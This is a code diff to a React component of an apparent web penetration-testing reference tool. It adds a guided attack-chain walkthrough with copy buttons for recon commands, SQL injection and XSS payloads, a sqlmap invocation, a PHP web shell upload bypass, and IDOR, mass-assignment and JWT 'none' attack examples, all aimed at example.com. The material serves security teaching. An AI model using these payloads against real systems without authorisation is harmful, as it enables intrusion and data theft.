@@ -19,6 +19,67 @@ const WebAppTesting = () => {
 
   const sections = [
     {
+      id: 'walkthrough',
+      title: 'Guided Web App Attack Chain Walkthrough',
+      content: [
+        {
+          type: 'markdown',
+          value: 'Follow this step-by-step chain for a typical web application penetration test. Expand each step for details and commands.'
+        },
+        {
+          type: 'step',
+          title: '1. Recon & Enumeration',
+          description: 'Identify endpoints, directories, and subdomains.',
+          commands: [
+            { value: 'ffuf -u http://example.com/FUZZ -w wordlist.txt', description: 'Directory brute-forcing' },
+            { value: 'subfinder -d example.com', description: 'Subdomain enumeration' },
+            { value: 'curl -I http://example.com', description: 'Check HTTP headers' }
+          ]
+        },
+        {
+          type: 'step',
+          title: '2. SQL Injection Testing',
+          description: 'Test for SQL injection vulnerabilities manually and with automation.',
+          commands: [
+            { value: "' OR 1=1 --", description: 'Manual SQLi payload' },
+            { value: 'sqlmap -u "http://example.com?id=1" --risk=3 --level=5 --batch', description: 'Automated SQLi with sqlmap' }
+          ]
+        },
+        {
+          type: 'step',
+          title: '3. XSS Testing',
+          description: 'Test for reflected and stored XSS.',
+          commands: [
+            { value: '<script>alert(1)</script>', description: 'Basic XSS payload' },
+            { value: '<svg/onload=alert(1)>', description: 'SVG XSS payload' }
+          ]
+        },
+        {
+          type: 'step',
+          title: '4. File Upload & RCE',
+          description: 'Test for file upload bypasses and remote code execution.',
+          commands: [
+            { value: 'GIF89a; <?php system($_GET[\'cmd\']); ?>', description: 'PHP file upload bypass (magic bytes)' },
+            { value: 'shell.php.jpg', description: 'Double extension upload' }
+          ]
+        },
+        {
+          type: 'step',
+          title: '5. API & Logic Attacks',
+          description: 'Test for IDOR, mass assignment, and JWT attacks.',
+          commands: [
+            { value: 'GET /api/user/123 HTTP/1.1', description: 'IDOR test' },
+            { value: 'POST /api/users HTTP/1.1\n{"username":"test","is_admin":true}', description: 'Mass assignment test' },
+            { value: 'eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.', description: 'JWT none attack' }
+          ]
+        },
+        {
+          type: 'markdown',
+          value: '**Tip:** After each step, check for new vulnerabilities and document your findings!'
+        }
+      ]
+    },
+    {
       id: 'basics',
       title: 'Basic Testing',
       content: [
@@ -179,30 +240,63 @@ eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
             >
               {expandedSection === section.id && (
                 <div className="content-inner">
-                  {section.content.map((item, index) => (
-                    <div key={index} className="content-item">
-                      {item.type === 'command' ? (
-                        <div className="command-item">
-                          <div className="command-header">
-                            <code>{item.value}</code>
-                            <button
-                              onClick={() => handleCopy(item.value)}
-                              className="copy-button small"
-                            >
-                              Copy
-                            </button>
+                  {section.content.map((item, index) => {
+                    if (item.type === 'command') {
+                      return (
+                        <div key={index} className="content-item">
+                          <div className="command-item">
+                            <div className="command-header">
+                              <code>{item.value}</code>
+                              <button
+                                onClick={() => handleCopy(item.value)}
+                                className="copy-button small"
+                              >
+                                Copy
+                              </button>
+                            </div>
+                            <p className="command-description">{item.description}</p>
                           </div>
-                          <p className="command-description">{item.description}</p>
                         </div>
-                      ) : (
-                        <div className="markdown-content">
-                          <ReactMarkdown>
-                            {item.value}
-                          </ReactMarkdown>
+                      );
+                    } else if (item.type === 'markdown') {
+                      return (
+                        <div key={index} className="content-item">
+                          <div className="markdown-content">
+                            <ReactMarkdown>
+                              {item.value}
+                            </ReactMarkdown>
+                          </div>
                         </div>
-                      )}
-                    </div>
-                  ))}
+                      );
+                    } else if (item.type === 'step') {
+                      return (
+                        <div key={index} className="content-item walkthrough-step">
+                          <div className="step-header">
+                            <strong>{item.title}</strong>
+                          </div>
+                          <div className="step-description">{item.description}</div>
+                          <div className="step-commands">
+                            {item.commands.map((cmd, i) => (
+                              <div key={i} className="command-item">
+                                <div className="command-header">
+                                  <code>{cmd.value}</code>
+                                  <button
+                                    onClick={() => handleCopy(cmd.value)}
+                                    className="copy-button small"
+                                  >
+                                    Copy
+                                  </button>
+                                </div>
+                                <p className="command-description">{cmd.description}</p>
+                              </div>
+                            ))}
+                          </div>
+                        </div>
+                      );
+                    } else {
+                      return null;
+                    }
+                  })}
                 </div>
               )}
             </motion.div>
